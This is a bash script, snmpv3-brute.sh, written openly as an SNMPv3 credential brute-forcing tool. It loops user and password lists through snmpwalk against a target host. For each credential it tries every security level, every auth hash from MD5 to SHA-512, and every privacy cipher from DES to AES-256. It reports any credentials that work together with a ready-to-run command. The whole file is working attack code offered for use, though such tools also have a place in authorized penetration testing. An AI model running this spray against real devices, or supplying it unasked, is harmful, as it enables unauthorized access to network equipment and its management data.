```bash
#!/usr/bin/env bash
#
# snmpv3-brute.sh - SNMPv3 credential + security-level/protocol spray
# Always runs the full sweep: noAuthNoPriv, authNoPriv, authPriv
# across every auth protocol (MD5, SHA, SHA-224/256/384/512) and
# every privacy protocol (DES, AES, AES-192, AES-256). No shortcuts.
#
# Usage:
#   ./snmpv3-brute.sh -t <target> [-u user | -U userlist] [-p pass | -P passlist] [-d]
#
# Examples:
#   ./snmpv3-brute.sh -t 10.1.43.53 -u waserby -P passwords.txt
#   ./snmpv3-brute.sh -t 10.1.43.53 -U users.txt -P passwords.txt -d

set -u

usage() {
    echo "Usage: $0 -t <target> [-u user | -U userlist] [-p pass | -P passlist] [-d]"
    echo ""
    echo "  -t  Target IP/host (required)"
    echo "  -u  Single username"
    echo "  -U  Path to username list"
    echo "  -p  Single password"
    echo "  -P  Path to password list"
    echo "  -d  Debug: show each attempt + raw error"
    echo ""
    echo "Exactly one of -u/-U and exactly one of -p/-P are required."
    echo ""
    echo "Note: for authPriv, the privacy (-X) passphrase is assumed to be"
    echo "the same as the auth (-A) passphrase. If a device uses a different"
    echo "priv passphrase, authPriv hits here will show as timeouts/failures"
    echo "even though authNoPriv succeeds -- check those manually."
    exit 1
}

target=""
single_user=""
user_list=""
single_pass=""
pass_list=""
debug=0
TIMEOUT=30

while getopts "t:u:U:p:P:dh" opt; do
    case "$opt" in
        t) target="$OPTARG" ;;
        u) single_user="$OPTARG" ;;
        U) user_list="$OPTARG" ;;
        p) single_pass="$OPTARG" ;;
        P) pass_list="$OPTARG" ;;
        d) debug=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# --- validation ---
[ -z "$target" ] && { echo "[!] -t <target> is required"; usage; }

if [ -n "$single_user" ] && [ -n "$user_list" ]; then
    echo "[!] Use either -u or -U, not both"; usage
fi
if [ -z "$single_user" ] && [ -z "$user_list" ]; then
    echo "[!] One of -u or -U is required"; usage
fi

if [ -n "$single_pass" ] && [ -n "$pass_list" ]; then
    echo "[!] Use either -p or -P, not both"; usage
fi
if [ -z "$single_pass" ] && [ -z "$pass_list" ]; then
    echo "[!] One of -p or -P is required"; usage
fi

if [ -n "$user_list" ] && [ ! -f "$user_list" ]; then
    echo "[!] Username list not found: $user_list"; exit 1
fi
if [ -n "$pass_list" ] && [ ! -f "$pass_list" ]; then
    echo "[!] Password list not found: $pass_list"; exit 1
fi

# --- build user/password arrays ---
users=()
if [ -n "$single_user" ]; then
    users=("$single_user")
else
    while IFS= read -r line; do
        line="${line%$'\r'}"
        [ -z "$line" ] && continue
        users+=("$line")
    done < "$user_list"
fi

passwords=()
if [ -n "$single_pass" ]; then
    passwords=("$single_pass")
else
    while IFS= read -r line; do
        line="${line%$'\r'}"
        [ -z "$line" ] && continue
        passwords+=("$line")
    done < "$pass_list"
fi

# --- protocol sets: always full ---
auth_protos=("MD5" "SHA" "SHA-224" "SHA-256" "SHA-384" "SHA-512")
priv_protos=("DES" "AES" "AES-192" "AES-256")

per_pair=$(( ${#auth_protos[@]} + (${#auth_protos[@]} * ${#priv_protos[@]}) ))

# count only passwords that pass the length filter, so the estimate matches what actually runs
valid_pass_count=0
for pass in "${passwords[@]}"; do
    [ ${#pass} -ge 8 ] && valid_pass_count=$((valid_pass_count + 1))
done

total_attempts=$(( ${#users[@]} * (1 + valid_pass_count * per_pair) ))

echo "[*] Target: $target"
echo "[*] Users: ${#users[@]}  Passwords: ${#passwords[@]} (${valid_pass_count} usable, min 8 chars)"
echo "[*] Auth protocols: ${auth_protos[*]}"
echo "[*] Priv protocols: ${priv_protos[*]}"
echo "[*] Total attempts: $total_attempts"
echo ""

start_time=$(date +%s)
attempt_num=0

# try_one LEVEL AUTHPROTO PRIVPROTO USER PASS
try_one() {
    local level="$1" authproto="$2" privproto="$3" user="$4" pass="$5"
    local args=(-v3 -u "$user" -l "$level")
    local label="$user / level=$level"

    if [ "$level" != "noAuthNoPriv" ]; then
        args+=(-A "$pass" -a "$authproto")
        label="$label authproto=$authproto pass=$pass"
    fi
    if [ "$level" == "authPriv" ]; then
        args+=(-X "$pass" -x "$privproto")
        label="$label privproto=$privproto"
    fi

    if [ "$debug" -eq 1 ]; then
        echo "[*] Trying: $label"
    fi

    local err rc
    err=$(timeout "$TIMEOUT" snmpwalk "${args[@]}" "$target" 2>&1 >/dev/null)
    rc=$?

    attempt_num=$((attempt_num + 1))
    if [ $((attempt_num % 50)) -eq 0 ]; then
        local now elapsed
        now=$(date +%s)
        elapsed=$((now - start_time))
        echo "    ... $attempt_num/$total_attempts attempts, ${elapsed}s elapsed"
    fi

    if [ "$rc" -eq 0 ]; then
        echo "[+] SUCCESS -> user: $user  level: $level  authproto: $authproto  privproto: $privproto  pass: $pass"
        echo "    Command: snmpwalk ${args[*]} $target"
        echo ""
        exit 0
    elif [ "$rc" -eq 124 ]; then
        echo "[?] Possible password found: $pass (level=$level, auth=$authproto, priv=$privproto) -- Try:"
        echo "      snmpwalk ${args[*]} $target"
        echo ""
    elif [ "$debug" -eq 1 ]; then
        echo "    rc=$rc  err=$err"
    fi
}

for user in "${users[@]}"; do

    try_one "noAuthNoPriv" "" "" "$user" ""

    for pass in "${passwords[@]}"; do
        [ ${#pass} -lt 8 ] && continue

        for authproto in "${auth_protos[@]}"; do
            try_one "authNoPriv" "$authproto" "" "$user" "$pass"

            for privproto in "${priv_protos[@]}"; do
                try_one "authPriv" "$authproto" "$privproto" "$user" "$pass"
            done
        done
    done
done

echo ""
echo "[-] Script finished. Please test all possible passwords found, if any."
echo ""
echo ""
exit 1
```
